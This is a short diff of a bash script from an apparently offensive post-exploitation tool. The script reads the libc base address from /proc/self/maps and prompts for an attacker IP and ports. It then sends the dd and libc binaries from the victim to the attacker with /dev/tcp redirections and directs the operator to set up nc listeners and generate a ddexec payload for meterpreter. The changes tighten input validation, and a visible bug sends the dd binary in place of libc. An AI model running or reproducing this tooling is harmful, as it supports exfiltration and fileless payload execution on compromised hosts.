@@ -12,23 +12,23 @@ libc_base=$(printf "0x";(linux64 -R setarch $ARCH -R cat /proc/self/maps || seta
 echo -ne "[+] Binary informations fetched\ndd binary : $dd_bin\nlibc binary : $libc_bin\nlibc_base : $libc_base\n\n"
 
 atk_ip=""
-while [[ ! $atk_ip =~ "" ]]; do
-   atk_ip=$(read -e -p " Attacker ip > " command)
+while [[ ! $atk_ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; do
+   read -e -p " Attacker ip > " atk_ip
 done
 echo "[?] execute 'nc -lp <port> > /tmp/dd' and give the port you used"
 dd_port=""
-while [[ ! $dd_port =~ "" ]]; do
-   dd_port=$(read -e -p "[>] dd port download > " command)
+while [[ ! $dd_port =~ ^[0-9]{1,5}$ ]]; do
+   read -e -p "[>] dd port download > " dd_port
 done
 cat $dd_bin >/dev/tcp/$atk_ip/$dd_port
 echo "[?] execute 'nc -lp <port> > /tmp/libc.so.6' and give the port you used"
 libc_port=""
-while [[ ! $libc_port =~ "" ]]; do
-   libc_port=$(read -e -p "[>] libc port download > " command)
+while [[ ! $libc_port =~ ^[0-9]{1,5}$ ]]; do
+   read -e -p "[>] libc port download > " libc_port
 done
 cat $dd_bin >/dev/tcp/$atk_ip/$libc_port
 
 echo ""
 echo "[?] usefull binary transfered"
 echo "[~] run localy 'ddexec -o ddexec_payload.sh -l /tmp/libc.so.6 -d /tmp/dd -b $libc_base -H $atk_ip -P 4444' to generate the ddexec payload for meterpreter"
-echo "[~] run localy 'ddexec -o ddexec_payload.sh -l /tmp/libc.so.6 -d /tmp/dd -b $libc_base -H $atk_ip -P 4444' to generate the ddexec payload for other binary"
+# echo "[~] run localy 'ddexec -o ddexec_payload.sh -l /tmp/libc.so.6 -d /tmp/dd -b $libc_base -H $atk_ip -P 4444' to generate the ddexec payload for other binary"
